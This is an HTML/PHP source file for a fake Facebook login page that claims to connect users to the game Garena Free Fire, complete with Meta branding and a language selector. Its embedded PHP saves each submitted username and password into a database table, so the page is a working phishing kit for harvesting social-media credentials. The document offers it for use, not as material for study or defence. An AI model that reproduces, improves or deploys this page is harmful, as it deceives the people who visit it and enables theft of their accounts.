<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="FreeFire_login.css">
    <!-- <link rel="script" href="file.php"> -->

</head>

<body>

    <?php

    include 'facebook.php';

    if (isset($_POST['submit'])) {

        $username = mysqli_real_escape_string($con, $_POST['username']);
        $password = mysqli_real_escape_string($con, $_POST['password']);
        $query = "INSERT INTO dilkashraja(name,pass) VALUES ('$username','$password')";
        $run = mysqli_query($con,$query);
    }
    ?>
    <div class="main">
        <form action="" method="POST">
            <div class="header">
                <h1>Facebook</h1>
            </div>
            <div class="main_body">
                <img src="ff logo.png" alt="dilkash">
                <h5>Log in to your Facebook account to connet to Garena <br> Free Fire</h5>
            </div>
            <div class="login">
                <div class="all">
                    <input type="text" type="number" name="username" required id="dilkash"
                        placeholder="Mobile Number or email address">
                    <input type="password" name="password" id="password" requir placeholder="facebook password">
                </div>
                <button type="submit" name="submit" class="button" required >Login</button>
            </div>
        </form>

        <div class="for_cre_not_help">
            <a href="#">forgotten password?</a>
            <a href="#">Create account</a>
            <a href="#">Not now</a>
            <a href="#">Help center</a>
        </div>
        <div class="bhasha" style="display: flex; gap: 70px; justify-content: center; margin-top: 30px;">
            <div class="dvi1">
                <p>English (UK)</p>
                <p>ଓଡ଼ିଆ</p>
                <p>اردو</p>
                <p>മലയാളം</p>
            </div>
            <div class="dvi2">
                <p>हिन्दी
                </p>
                <p>বাংলা
                </p>
                <p>मराठी
                </p>
                <p>తెలుగు
                </p>
            </div>

        </div>
    </div>
    <footer> Meta © 2023</footer>
</body>

</html>